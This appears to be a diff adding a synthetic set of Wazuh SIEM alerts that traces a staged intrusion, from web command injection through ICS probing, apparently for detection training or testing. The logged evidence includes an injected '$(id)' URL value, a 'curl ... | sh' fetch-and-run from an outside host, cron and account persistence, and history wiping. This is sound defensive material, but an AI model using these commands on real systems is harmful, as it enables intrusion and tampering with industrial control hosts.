@@ -1,0 +1,418 @@
+[
+  {
+    "timestamp": "2026-11-14T02:01:00.000+0000",
+    "rule": {
+      "level": 3,
+      "description": "PAM: Login session opened.",
+      "id": "5501",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "pam",
+        "syslog",
+        "authentication_success"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "ws-ops-01",
+      "ip": "10.20.20.101"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794621660.439563",
+    "full_log": "Nov 14 09:01:00 ws-ops-01 sshd[2211]: pam_unix(sshd:session): session opened for user operator1",
+    "decoder": {
+      "name": "pam"
+    },
+    "data": {
+      "dstuser": "operator1"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:02:20.000+0000",
+    "rule": {
+      "level": 3,
+      "description": "PAM: Login session opened.",
+      "id": "5501",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "pam",
+        "syslog",
+        "authentication_success"
+      ]
+    },
+    "agent": {
+      "id": "002",
+      "name": "srv-db-01",
+      "ip": "10.20.20.10"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794621740.258176",
+    "full_log": "Nov 14 09:02:20 srv-db-01 sshd[884]: pam_unix(sshd:session): session opened for user dbadmin",
+    "decoder": {
+      "name": "pam"
+    },
+    "data": {
+      "dstuser": "dbadmin"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:05:30.000+0000",
+    "rule": {
+      "level": 3,
+      "description": "PAM: Login session opened.",
+      "id": "5501",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "pam",
+        "syslog",
+        "authentication_success"
+      ]
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-01",
+      "ip": "10.10.10.101"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794621930.782554",
+    "full_log": "Nov 14 09:05:30 ws-01 sshd[1301]: pam_unix(sshd:session): session opened for user staff1",
+    "decoder": {
+      "name": "pam"
+    },
+    "data": {
+      "dstuser": "staff1"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:12:09.000+0000",
+    "rule": {
+      "level": 10,
+      "description": "Command injection pattern followed by HTTP 200 (possible successful web exploitation)",
+      "id": "100110",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "web",
+        "attack",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Exploit Public-Facing Application"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "srv-app-01",
+      "ip": "10.10.10.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794622329.175954",
+    "full_log": "203.0.113.45 - - [14/Nov/2026:09:12:08 +0700] \"POST /api/v1/export?fmt=$(id) HTTP/1.1\" 200 1432 \"-\" \"python-requests/2.31\"",
+    "decoder": {
+      "name": "web-accesslog"
+    },
+    "data": {
+      "srcip": "203.0.113.45",
+      "protocol": "POST",
+      "id": "200",
+      "url": "/api/v1/export?fmt=$(id)"
+    },
+    "location": "/var/log/nginx/access.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:13:44.000+0000",
+    "rule": {
+      "level": 12,
+      "description": "Web server process spawned a shell (nginx -> /bin/sh)",
+      "id": "100120",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "audit",
+        "execution",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1059.004"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Unix Shell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "srv-app-01",
+      "ip": "10.10.10.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794622424.961168",
+    "full_log": "type=EXECVE msg=audit(1763086424.211:9921): argc=3 a0=\"sh\" a1=\"-c\" a2=\"curl -s http://203.0.113.45/s | sh\"",
+    "decoder": {
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "exe": "/bin/sh",
+        "parent": "/usr/sbin/nginx",
+        "command": "sh -c 'curl -s http://203.0.113.45/s | sh'",
+        "uid": "33"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:17:02.000+0000",
+    "rule": {
+      "level": 9,
+      "description": "New cron job created by web server user",
+      "id": "100140",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "syscheck",
+        "persistence",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1053.003"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Cron"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "srv-app-01",
+      "ip": "10.10.10.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794622622.198702",
+    "full_log": "File '/etc/cron.d/sysupdate' added. Mode: realtime",
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "data": {
+      "path": "/etc/cron.d/sysupdate",
+      "event": "added",
+      "mode": "realtime",
+      "uname": "www-data"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-14T02:19:26.000+0000",
+    "rule": {
+      "level": 8,
+      "description": "New user added to the system.",
+      "id": "5902",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "adduser",
+        "account_changed"
+      ],
+      "mitre": {
+        "id": [
+          "T1136.001"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Local Account"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "srv-app-01",
+      "ip": "10.10.10.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794622766.483452",
+    "full_log": "Nov 14 09:19:26 srv-app-01 useradd[4410]: new user: name=svc_update, UID=1001, GID=1001",
+    "decoder": {
+      "name": "adduser"
+    },
+    "data": {
+      "dstuser": "svc_update",
+      "uid": "1001"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:26:40.000+0000",
+    "rule": {
+      "level": 10,
+      "description": "Modbus/TCP session from unapproved source address",
+      "id": "100210",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "ics",
+        "modbus",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1046"
+        ],
+        "tactic": [
+          "Discovery"
+        ],
+        "technique": [
+          "Network Service Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "srv-scada-01",
+      "ip": "10.20.20.11"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794623200.139317",
+    "full_log": "modbus-guard[771]: ALERT session from 10.10.10.20:49213 not in allowlist (unit 1, fc 43)",
+    "decoder": {
+      "name": "modbus-guard"
+    },
+    "data": {
+      "srcip": "10.10.10.20",
+      "dstport": "502",
+      "unit_id": "1"
+    },
+    "location": "/var/log/modbus-guard.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:30:12.000+0000",
+    "rule": {
+      "level": 10,
+      "description": "Shell history file truncated",
+      "id": "100150",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "audit",
+        "defense_evasion",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1070.003"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Clear Command History"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "srv-app-01",
+      "ip": "10.10.10.20"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794623412.554710",
+    "full_log": "type=EXECVE msg=audit(1763087532.502:9987): argc=4 a0=\"truncate\" a1=\"-s\" a2=\"0\" a3=\"/home/svc_update/.bash_history\"",
+    "decoder": {
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "command": "truncate -s 0 /home/svc_update/.bash_history",
+        "uid": "1001"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-14T02:41:55.000+0000",
+    "rule": {
+      "level": 8,
+      "description": "Executable written to /tmp after outbound download (curl)",
+      "id": "100160",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "audit",
+        "command_and_control",
+        "local"
+      ],
+      "mitre": {
+        "id": [
+          "T1105"
+        ],
+        "tactic": [
+          "Command and Control"
+        ],
+        "technique": [
+          "Ingress Tool Transfer"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "ws-02",
+      "ip": "10.10.10.102"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1794624115.173248",
+    "full_log": "type=EXECVE msg=audit(1763088115.020:10211): argc=4 a0=\"curl\" a1=\"-o\" a2=\"/tmp/.u\" a3=\"https://cdn-sync-9.test/a\"",
+    "decoder": {
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "command": "curl -o /tmp/.u https://cdn-sync-9.test/a",
+        "uid": "1000"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  }
+]
